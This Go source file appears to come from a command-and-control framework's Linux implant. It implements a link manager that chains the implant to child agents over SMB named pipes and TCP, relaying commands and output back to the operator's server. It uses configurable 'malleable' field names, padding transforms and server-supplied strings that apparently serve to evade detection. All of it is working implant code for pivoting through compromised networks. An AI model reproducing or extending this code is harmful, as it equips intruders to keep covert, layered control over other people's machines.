// server/docker/payloads/Linux/link_manager.go
// link manager for connecting to TCP child agents

//go:build linux
// +build linux

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Template indices for link manager strings (must match server's common.go)
// Note: idxLinkProtoSmb and idxLinkProtoTcp are defined in action_link.go
const (
	idxLinkKeyType      = 133
	idxLinkKeyPayload   = 134
	idxLinkMsgData      = 135
	idxLinkMsgDisconn   = 136
	idxLinkMsgHandshake = 137
	idxLinkMsgPing      = 138
	idxLinkMsgPong      = 139
	idxLinkStatusActive = 340
	idxLinkStatusInact  = 341
	idxLinkAuthPrefix   = 342
	idxLinkAuthOK       = 343
	idxLinkFmtList      = 344
	idxLinkFmtRow       = 345
	idxLinkTimeFmt      = 346
)

// linkManagerTemplate stores the template received from the server
var linkManagerTemplate []string
var linkManagerTemplateMu sync.RWMutex

// SetLinkManagerTemplate stores the template for link manager use
func SetLinkManagerTemplate(templates []string) {
	linkManagerTemplateMu.Lock()
	defer linkManagerTemplateMu.Unlock()
	linkManagerTemplate = templates
}

// lmTpl retrieves a template string by index
// Template must be set via SetLinkManagerTemplate before link operations
func lmTpl(idx int) string {
	linkManagerTemplateMu.RLock()
	tpl := linkManagerTemplate
	linkManagerTemplateMu.RUnlock()

	if tpl != nil && idx < len(tpl) {
		return tpl[idx]
	}
	return ""
}

// Convenience variables that call lmTpl (for cleaner code)
func lmKeyType() string       { return lmTpl(idxLinkKeyType) }
func lmKeyPayload() string    { return lmTpl(idxLinkKeyPayload) }
func lmTypeData() string      { return lmTpl(idxLinkMsgData) }
func lmTypeDisconn() string   { return lmTpl(idxLinkMsgDisconn) }
func lmTypeHandshake() string { return lmTpl(idxLinkMsgHandshake) }
func lmTypePing() string      { return lmTpl(idxLinkMsgPing) }
func lmTypePong() string      { return lmTpl(idxLinkMsgPong) }
func lmStatusActive() string  { return lmTpl(idxLinkStatusActive) }
func lmStatusInact() string   { return lmTpl(idxLinkStatusInact) }
func lmAuthPrefix() string    { return lmTpl(idxLinkAuthPrefix) }
func lmAuthOK() string        { return lmTpl(idxLinkAuthOK) }
func lmFmtLinks() string      { return lmTpl(idxLinkFmtList) }
func lmFmtLinkRow() string    { return lmTpl(idxLinkFmtRow) }
func lmTimeFmt() string       { return lmTpl(idxLinkTimeFmt) }

// Heartbeat configuration
const (
	heartbeatInterval = 60 * time.Second // Send ping every 60 seconds
)

// RPeer represents a connected SMB or TCP agent
type RPeer struct {
	RID         string    // Short routing ID (assigned by this agent)
	PipePath          string    // Full pipe path for SMB (\\server\pipe\name)
	Address           string    // TCP address for TCP links (host:port)
	LinkType          string    // "smb" or "tcp"
	Conn              net.Conn  // Active connection (pipe or TCP)
	Connected         time.Time // When the link was established
	LastSeen          time.Time // Last successful communication
	IsActive          bool      // Whether the link is active
	Pending bool      // True after auth, false after first message (for state-based routing)
	prependLen        int       // Prepend length for transform reversal
	appendLen         int       // Append length for transform reversal
	mu                sync.Mutex
}

// RMgr manages connections to linked SMB and TCP agents
type RMgr struct {
	mu             sync.RWMutex
	links          map[string]*RPeer // routingID -> RPeer
	pipeToRoute    map[string]string       // pipePath -> routingID (for SMB dedup)
	addressToRoute map[string]string       // address -> routingID (for TCP dedup)
	nextID         uint32                  // Atomic counter for generating routing IDs
	outboundData   chan *ROut       // Data received from linked agents, to be sent to server
	handshakeData  chan *ROut       // Handshake data from new linked agents (sent via "lh" field)

	// Response channels for synchronous command/response patterns
	responseChannels map[string]chan *ROut // routingID -> response channel
	responseMu       sync.RWMutex

	// unlink notifications to be sent to server
	unlinkNotifications chan string // Routing IDs that have been unlinked
}

// ROut represents data from a linked agent to be forwarded to the server
type ROut struct {
	RID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend
	AppendLength  int    `json:"app,omitempty"` // Length of random append
}

// RIn represents data from the server destined for a linked agent
type RIn struct {
	RID     string `json:"r"`             // Routing ID
	Payload       string `json:"p"`             // Base64 encoded payload
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend
	AppendLength  int    `json:"app,omitempty"` // Length of random append
}

// toMalleableMap converts ROut to a map using configurable field names
// This avoids hardcoded JSON struct tags when marshaling
func (ld *ROut) toMalleableMap() map[string]interface{} {
	m := map[string]interface{}{
		MALLEABLE_ROUTING_ID_FIELD: ld.RID,
		MALLEABLE_PAYLOAD_FIELD:    ld.Payload,
	}
	if ld.PrependLength > 0 {
		m["pre"] = ld.PrependLength
	}
	if ld.AppendLength > 0 {
		m["app"] = ld.AppendLength
	}
	return m
}

// ConvertLinkDataToMaps converts a slice of ROut to maps with malleable field names
func ConvertLinkDataToMaps(data []*ROut) []map[string]interface{} {
	if data == nil {
		return nil
	}
	result := make([]map[string]interface{}, len(data))
	for i, ld := range data {
		result[i] = ld.toMalleableMap()
	}
	return result
}

var (
	linkManager     *RMgr
	linkManagerOnce sync.Once
)

// getLinkManager returns the singleton link manager
func getLinkManager() *RMgr {
	linkManagerOnce.Do(func() {
		linkManager = &RMgr{
			links:               make(map[string]*RPeer),
			pipeToRoute:         make(map[string]string),
			addressToRoute:      make(map[string]string),
			outboundData:        make(chan *ROut, 1000),
			handshakeData:       make(chan *ROut, 50),
			responseChannels:    make(map[string]chan *ROut),
			unlinkNotifications: make(chan string, 100),
		}
		// Start the heartbeat goroutine to keep links alive
		linkManager.startHeartbeat()
	})
	return linkManager
}

// generateRoutingID creates a short, unique routing ID
func (lm *RMgr) generateRoutingID() string {
	id := atomic.AddUint32(&lm.nextID, 1)
	return fmt.Sprintf("%x", id)
}

// link establishes a connection to an SMB agent via named pipe
// creds can be nil for anonymous authentication
func (lm *RMgr) link(pipePath string, creds *RA) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this pipe
	if existingRoute, exists := lm.pipeToRoute[pipePath]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf("%s", Err(E5))
		}
	}

	// Connect to the named pipe via SMB with credentials
	conn, err := connectToPipe(pipePath, creds)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Perform lightweight authentication with the SMB agent
	if err := performLinkAuth(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.generateRoutingID()

	// Create linked agent entry
	link := &RPeer{
		RID:         routingID,
		PipePath:          pipePath,
		LinkType:          lmTpl(idxLinkProtoSmb),
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		Pending: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.pipeToRoute[pipePath] = routingID

	// For SMB links using go-smb2, we CANNOT use a background read goroutine
	// because go-smb2 doesn't support concurrent read/write on the same file handle.
	// Instead, read the handshake synchronously here, then use request-response pattern for commands.

	// Read the initial handshake from the SMB agent with timeout
	handshakeData, err := lm.readWithTimeout(conn, 30*time.Second)
	if err != nil {
		conn.Close()
		delete(lm.links, routingID)
		delete(lm.pipeToRoute, pipePath)
		return "", fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	// Parse handshake message
	var message map[string]string
	if err := json.Unmarshal(handshakeData, &message); err == nil && message[lmKeyType()] == lmTypeHandshake() {
		// Queue handshake for server via "lh" field
		outbound := &ROut{
			RID: routingID,
			Payload:   message[lmKeyPayload()],
		}
		select {
		case lm.handshakeData <- outbound:
		default:
		}
		link.Pending = false
	} else {
		// Raw handshake data (for transforms)
		outbound := &ROut{
			RID: routingID,
			Payload:   base64.StdEncoding.EncodeToString(handshakeData),
		}
		select {
		case lm.handshakeData <- outbound:
		default:
		}
		link.Pending = false
	}

	link.LastSeen = time.Now()

	// NOTE: Do NOT start handleIncomingData goroutine for SMB links!
	// go-smb2 requires synchronous request-response pattern.
	// Commands will be handled by forwardToLinkedAgentAndWait which does its own read.

	return routingID, nil
}

// linkTCP establishes a connection to a TCP agent
func (lm *RMgr) linkTCP(address string) (string, error) {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	// Check if already linked to this address
	if existingRoute, exists := lm.addressToRoute[address]; exists {
		if link, ok := lm.links[existingRoute]; ok && link.IsActive {
			return "", fmt.Errorf("%s", Err(E5))
		}
	}

	// Connect via TCP
	conn, err := dialTCP(address, 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("%s", ErrCtx(E12, err.Error()))
	}

	// Perform HMAC-based authentication with the TCP agent
	if err := performLinkAuthTCP(conn); err != nil {
		conn.Close()
		return "", fmt.Errorf("%s", ErrCtx(E3, err.Error()))
	}

	// Generate routing ID
	routingID := lm.generateRoutingID()

	// Create linked agent entry
	link := &RPeer{
		RID:         routingID,
		Address:           address,
		LinkType:          lmTpl(idxLinkProtoTcp),
		Conn:              conn,
		Connected:         time.Now(),
		LastSeen:          time.Now(),
		IsActive:          true,
		Pending: true, // First message after auth is always handshake
	}

	// Store the link
	lm.links[routingID] = link
	lm.addressToRoute[address] = routingID

	// Start goroutine to handle incoming data from the TCP agent
	go lm.handleIncomingData(link)

	return routingID, nil
}

// unlink disconnects from a linked agent
func (lm *RMgr) unlink(routingID string) error {
	lm.mu.Lock()
	defer lm.mu.Unlock()

	link, exists := lm.links[routingID]
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	// Send graceful disconnect message
	if link.IsActive && link.Conn != nil {
		sendDisconnectMessage(link.Conn)
	}

	// Close the connection
	if link.Conn != nil {
		link.Conn.Close()
	}

	link.IsActive = false

	// Queue unlink notification to be sent to server
	select {
	case lm.unlinkNotifications <- routingID:
	default:
	}

	// Remove from maps based on link type
	if link.LinkType == lmTpl(idxLinkProtoTcp) {
		delete(lm.addressToRoute, link.Address)
	} else {
		delete(lm.pipeToRoute, link.PipePath)
	}
	delete(lm.links, routingID)

	return nil
}

// getLink returns a linked agent by routing ID
func (lm *RMgr) getLink(routingID string) (*RPeer, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	if !exists || !link.IsActive {
		return nil, false
	}
	return link, true
}

// getLinkDirect returns a linked agent by routing ID without checking IsActive
// Used for handshake responses where the link might not be fully active yet
func (lm *RMgr) getLinkDirect(routingID string) (*RPeer, bool) {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	link, exists := lm.links[routingID]
	return link, exists
}

// getActiveLinks returns all active linked agents
func (lm *RMgr) getActiveLinks() []*RPeer {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	var active []*RPeer
	for _, link := range lm.links {
		if link.IsActive {
			active = append(active, link)
		}
	}
	return active
}

// forwardToLinkedAgent sends data from parent to a linked (child) agent
func (lm *RMgr) forwardToLinkedAgent(routingID string, payload string) error {
	link, exists := lm.getLink(routingID)
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	// Send the payload over TCP
	message := map[string]string{}
	message[lmKeyType()] = lmTypeData()
	message[lmKeyPayload()] = payload

	data, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Write with timeout using goroutine (SetWriteDeadline doesn't work with go-smb2)
	conn := link.Conn
	done := make(chan error, 1)
	go func() {
		done <- writeMessage(conn, data)
	}()

	select {
	case err := <-done:
		if err != nil {
			link.IsActive = false
			return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
		}
	case <-time.After(10 * time.Second):
		link.IsActive = false
		return fmt.Errorf("%s", Err(E9)) // Timeout error
	}

	link.LastSeen = time.Now()
	return nil
}

// forwardToLinkedAgentRaw sends raw transformed data to a linked agent
func (lm *RMgr) forwardToLinkedAgentRaw(routingID string, data []byte, prepend, appendLen int) error {
	link, exists := lm.getLink(routingID)
	if !exists {
		return fmt.Errorf("%s", Err(E4))
	}

	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	// Store transform lengths for response handling
	link.prependLen = prepend
	link.appendLen = appendLen

	// Write with timeout using goroutine (SetWriteDeadline doesn't work with go-smb2)
	conn := link.Conn
	done := make(chan error, 1)
	go func() {
		done <- writeMessage(conn, data)
	}()

	select {
	case err := <-done:
		if err != nil {
			link.IsActive = false
			return fmt.Errorf("%s", ErrCtx(E11, err.Error()))
		}
	case <-time.After(10 * time.Second):
		link.IsActive = false
		return fmt.Errorf("%s", Err(E9)) // Timeout error
	}

	link.LastSeen = time.Now()
	return nil
}

// forwardToLinkedAgentAndWait sends data to a linked agent and waits for a response
func (lm *RMgr) forwardToLinkedAgentAndWait(routingID string, payload string, timeout time.Duration) (*ROut, error) {
	link, exists := lm.getLink(routingID)
	if !exists {
		return nil, fmt.Errorf("%s", Err(E4))
	}

	// For SMB links, use synchronous request-response pattern
	// go-smb2 doesn't support concurrent read/write on the same file handle
	if link.LinkType == lmTpl(idxLinkProtoSmb) {
		return lm.forwardToSMBAgentAndWait(link, payload, timeout)
	}

	// For TCP links, use the async response channel mechanism
	// TCP supports concurrent read/write, so handleIncomingData goroutine works
	respChan := make(chan *ROut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the command
	if err := lm.forwardToLinkedAgent(routingID, payload); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// forwardToSMBAgentAndWait handles synchronous request-response for SMB links
// This is necessary because go-smb2 doesn't support concurrent read/write
func (lm *RMgr) forwardToSMBAgentAndWait(link *RPeer, payload string, timeout time.Duration) (*ROut, error) {
	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return nil, fmt.Errorf("%s", Err(E4))
	}

	// Create the command message
	message := map[string]string{}
	message[lmKeyType()] = lmTypeData()
	message[lmKeyPayload()] = payload

	data, err := json.Marshal(message)
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// Write the command with timeout
	if err := lm.writeWithTimeout(link.Conn, data, timeout); err != nil {
		link.IsActive = false
		return nil, fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Read the response with timeout
	respData, err := lm.readWithTimeout(link.Conn, timeout)
	if err != nil {
		link.IsActive = false
		return nil, fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	link.LastSeen = time.Now()

	// Parse response - could be JSON envelope or raw transformed data
	var respMsg map[string]string
	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType()] == lmTypeData() {
		// Legacy JSON envelope format
		return &ROut{
			RID: link.RID,
			Payload:   respMsg[lmKeyPayload()],
		}, nil
	}

	// Raw transformed data - base64 encode
	return &ROut{
		RID:     link.RID,
		Payload:       base64.StdEncoding.EncodeToString(respData),
		PrependLength: link.prependLen,
		AppendLength:  link.appendLen,
	}, nil
}

// forwardToLinkedAgentRawAndWait sends raw transformed data to a linked agent and waits for response
func (lm *RMgr) forwardToLinkedAgentRawAndWait(routingID string, payload string, prependLen, appendLen int, timeout time.Duration) (*ROut, error) {
	link, exists := lm.getLink(routingID)
	if !exists {
		return nil, fmt.Errorf("%s", Err(E4))
	}

	// Decode base64 payload
	rawData, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, fmt.Errorf("%s", ErrCtx(E18, err.Error()))
	}

	// For SMB links, use synchronous request-response pattern
	if link.LinkType == lmTpl(idxLinkProtoSmb) {
		return lm.forwardToSMBAgentRawAndWait(link, rawData, prependLen, appendLen, timeout)
	}

	// For TCP links, use the async response channel mechanism
	respChan := make(chan *ROut, 1)

	lm.responseMu.Lock()
	lm.responseChannels[routingID] = respChan
	lm.responseMu.Unlock()

	defer func() {
		lm.responseMu.Lock()
		delete(lm.responseChannels, routingID)
		lm.responseMu.Unlock()
	}()

	// Forward the raw data
	if err := lm.forwardToLinkedAgentRaw(routingID, rawData, prependLen, appendLen); err != nil {
		return nil, err
	}

	// Wait for response with timeout
	select {
	case response := <-respChan:
		return response, nil
	case <-time.After(timeout):
		return nil, nil // Timeout is not an error - response will come later via normal queue
	}
}

// forwardToSMBAgentRawAndWait handles synchronous raw request-response for SMB links
func (lm *RMgr) forwardToSMBAgentRawAndWait(link *RPeer, rawData []byte, prependLen, appendLen int, timeout time.Duration) (*ROut, error) {
	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return nil, fmt.Errorf("%s", Err(E4))
	}

	// Store transform lengths for response handling
	link.prependLen = prependLen
	link.appendLen = appendLen

	// Write raw bytes directly with timeout
	if err := lm.writeWithTimeout(link.Conn, rawData, timeout); err != nil {
		link.IsActive = false
		return nil, fmt.Errorf("%s", ErrCtx(E11, err.Error()))
	}

	// Read the response with timeout
	respData, err := lm.readWithTimeout(link.Conn, timeout)
	if err != nil {
		link.IsActive = false
		return nil, fmt.Errorf("%s", ErrCtx(E10, err.Error()))
	}

	link.LastSeen = time.Now()

	// Parse response - could be JSON envelope or raw transformed data
	var respMsg map[string]string
	if err := json.Unmarshal(respData, &respMsg); err == nil && respMsg[lmKeyType()] == lmTypeData() {
		return &ROut{
			RID: link.RID,
			Payload:   respMsg[lmKeyPayload()],
		}, nil
	}

	// Raw transformed data
	return &ROut{
		RID:     link.RID,
		Payload:       base64.StdEncoding.EncodeToString(respData),
		PrependLength: prependLen,
		AppendLength:  appendLen,
	}, nil
}

// getOutboundData returns data that needs to be sent to the server
func (lm *RMgr) getOutboundData() []*ROut {
	var data []*ROut

	// Drain the channel (non-blocking)
	for {
		select {
		case item := <-lm.outboundData:
			data = append(data, item)
		default:
			return data
		}
	}
}

// getHandshakeData returns a single handshake to send to the server (via "lh" field)
// Returns nil if no handshake is pending
func (lm *RMgr) getHandshakeData() *ROut {
	select {
	case handshake := <-lm.handshakeData:
		return handshake
	default:
		return nil
	}
}

// getUnlinkNotifications returns routing IDs that have been unlinked
func (lm *RMgr) getUnlinkNotifications() []string {
	var notifications []string

	// Drain the channel (non-blocking)
	for {
		select {
		case routingID := <-lm.unlinkNotifications:
			notifications = append(notifications, routingID)
		default:
			return notifications
		}
	}
}

// handleIncomingData reads data from a linked agent and queues it for the server
func (lm *RMgr) handleIncomingData(link *RPeer) {
	defer func() {
		link.mu.Lock()
		link.IsActive = false
		link.mu.Unlock()
	}()

	for {
		// Read length-prefixed message
		data, err := readMessage(link.Conn)
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var message map[string]string
		if err := json.Unmarshal(data, &message); err == nil && message[lmKeyType()] != "" {
			// Successfully parsed as JSON with type field - legacy format
			switch message[lmKeyType()] {
			case lmTypeData():
				// Build outbound data
				outbound := &ROut{
					RID: link.RID,
					Payload:   message[lmKeyPayload()],
				}
				lm.deliverOutbound(link, outbound)

			case lmTypeHandshake():
				// Initial handshake from SMB/TCP agent - queue for server via "lh" field
				outbound := &ROut{
					RID: link.RID,
					Payload:   message[lmKeyPayload()],
				}
				select {
				case lm.handshakeData <- outbound:
				default:
				}

				// Clear handshake state after receiving JSON handshake
				link.mu.Lock()
				link.Pending = false
				link.mu.Unlock()

			case lmTypePong():
				// Heartbeat response from child agent - just update LastSeen

			case lmTypeDisconn():
				return
			}
		} else {
			// Not valid JSON or no type field - treat as raw transformed data
			// Child agent sent pre-transformed blob, base64 encode and forward
			link.mu.Lock()
			isHandshake := link.Pending
			prependLen := link.prependLen
			appendLen := link.appendLen
			link.Pending = false // First message consumed
			link.mu.Unlock()

			outbound := &ROut{
				RID:     link.RID,
				Payload:       base64.StdEncoding.EncodeToString(data),
				PrependLength: prependLen,
				AppendLength:  appendLen,
			}

			if isHandshake {
				// First message after auth = handshake (for agents that send opaque handshakes)
				select {
				case lm.handshakeData <- outbound:
				default:
				}
			} else {
				// Subsequent messages = data
				lm.deliverOutbound(link, outbound)
			}
		}

		link.mu.Lock()
		link.LastSeen = time.Now()
		link.mu.Unlock()
	}
}

// deliverOutbound delivers data to synchronous waiter or queues for async processing
func (lm *RMgr) deliverOutbound(link *RPeer, outbound *ROut) {
	// Check if someone is waiting synchronously for this response
	lm.responseMu.RLock()
	respChan, hasSyncWaiter := lm.responseChannels[link.RID]
	lm.responseMu.RUnlock()

	if hasSyncWaiter {
		// Send to synchronous waiter (non-blocking)
		select {
		case respChan <- outbound:
		default:
			// Channel full or closed, fall back to async queue
			lm.queueOutboundData(outbound)
		}
	} else {
		// No synchronous waiter, queue for normal async processing
		lm.queueOutboundData(outbound)
	}
}

// queueOutboundData is a helper to queue data for async delivery to server
func (lm *RMgr) queueOutboundData(outbound *ROut) {
	select {
	case lm.outboundData <- outbound:
	default:
		// Channel full, data dropped
	}
}

// queueHandshakeData is a helper to queue handshake data for async delivery to server via "lh" field
func (lm *RMgr) queueHandshakeData(data *ROut) {
	select {
	case lm.handshakeData <- data:
	default:
	}
}

// readWithTimeout reads a message from conn with a timeout using a goroutine
// This is necessary for go-smb2 because SetReadDeadline doesn't work on SMB2 file handles
func (lm *RMgr) readWithTimeout(conn net.Conn, timeout time.Duration) ([]byte, error) {
	dataChan := make(chan []byte, 1)
	errChan := make(chan error, 1)

	go func() {
		data, err := readMessage(conn)
		if err != nil {
			errChan <- err
		} else {
			dataChan <- data
		}
	}()

	select {
	case data := <-dataChan:
		return data, nil
	case err := <-errChan:
		return nil, err
	case <-time.After(timeout):
		return nil, fmt.Errorf("%s", Err(E9)) // Timeout
	}
}

// writeWithTimeout writes a message to conn with a timeout using a goroutine
// This is necessary for go-smb2 because SetWriteDeadline doesn't work on SMB2 file handles
func (lm *RMgr) writeWithTimeout(conn net.Conn, data []byte, timeout time.Duration) error {
	done := make(chan error, 1)

	go func() {
		done <- writeMessage(conn, data)
	}()

	select {
	case err := <-done:
		return err
	case <-time.After(timeout):
		return fmt.Errorf("%s", Err(E9)) // Timeout
	}
}

// listLinks returns a summary of all linked agents
func (lm *RMgr) listLinks() string {
	lm.mu.RLock()
	defer lm.mu.RUnlock()

	if len(lm.links) == 0 {
		return Succ(S0)
	}

	result := fmt.Sprintf(lmFmtLinks(), len(lm.links))
	for routingID, link := range lm.links {
		status := lmStatusActive()
		if !link.IsActive {
			status = lmStatusInact()
		}
		// Show pipe path for SMB, address for TCP
		displayPath := link.Address
		if link.LinkType == lmTpl(idxLinkProtoSmb) {
			displayPath = link.PipePath
		}
		result += fmt.Sprintf(lmFmtLinkRow(),
			routingID, displayPath, status,
			link.Connected.Format(lmTimeFmt()),
			link.LastSeen.Format(lmTimeFmt()))
	}
	return result
}

// Helper functions

func sendDisconnectMessage(conn net.Conn) {
	message := map[string]string{}
	message[lmKeyType()] = lmTypeDisconn()
	data, _ := json.Marshal(message)
	conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
	writeMessage(conn, data)
}

func writeMessage(conn net.Conn, data []byte) error {
	// Length-prefixed message: 4-byte little-endian length + data
	length := uint32(len(data))
	header := []byte{
		byte(length),
		byte(length >> 8),
		byte(length >> 16),
		byte(length >> 24),
	}

	if _, err := conn.Write(header); err != nil {
		return err
	}
	_, err := conn.Write(data)
	return err
}

func readMessage(conn net.Conn) ([]byte, error) {
	// Read 4-byte length header using io.ReadFull to handle partial reads
	// This is critical for SMB pipes where reads may return fewer bytes than requested
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return nil, err
	}

	length := uint32(header[0]) | uint32(header[1])<<8 | uint32(header[2])<<16 | uint32(header[3])<<24

	// Sanity check
	if length > 10*1024*1024 { // 10MB max
		return nil, fmt.Errorf("%s", Err(E2))
	}

	// Read data using io.ReadFull
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return nil, err
	}

	return data, nil
}

// startHeartbeat starts the heartbeat goroutine that pings all active links periodically
func (lm *RMgr) startHeartbeat() {
	go func() {
		ticker := time.NewTicker(heartbeatInterval)
		defer ticker.Stop()

		for range ticker.C {
			lm.pingAllLinks()
		}
	}()
}

// pingAllLinks sends a ping message to all active linked agents
func (lm *RMgr) pingAllLinks() {
	lm.mu.RLock()
	links := make([]*RPeer, 0, len(lm.links))
	for _, link := range lm.links {
		if link.IsActive {
			links = append(links, link)
		}
	}
	lm.mu.RUnlock()

	for _, link := range links {
		// Skip heartbeats for SMB links - go-smb2 requires synchronous request-response
		// and we can't read the pong without interfering with command responses
		if link.LinkType == lmTpl(idxLinkProtoSmb) {
			continue
		}
		lm.sendPing(link)
	}
}

// sendPing sends a ping message to a specific linked agent
func (lm *RMgr) sendPing(link *RPeer) error {
	link.mu.Lock()
	defer link.mu.Unlock()

	if link.Conn == nil || !link.IsActive {
		return fmt.Errorf("%s", Err(E4))
	}

	message := map[string]string{}
	message[lmKeyType()] = lmTypePing()

	data, err := json.Marshal(message)
	if err != nil {
		return err
	}

	// Set a short write deadline for ping
	link.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer link.Conn.SetWriteDeadline(time.Time{})

	if err := writeMessage(link.Conn, data); err != nil {
		link.IsActive = false
		return err
	}

	return nil
}
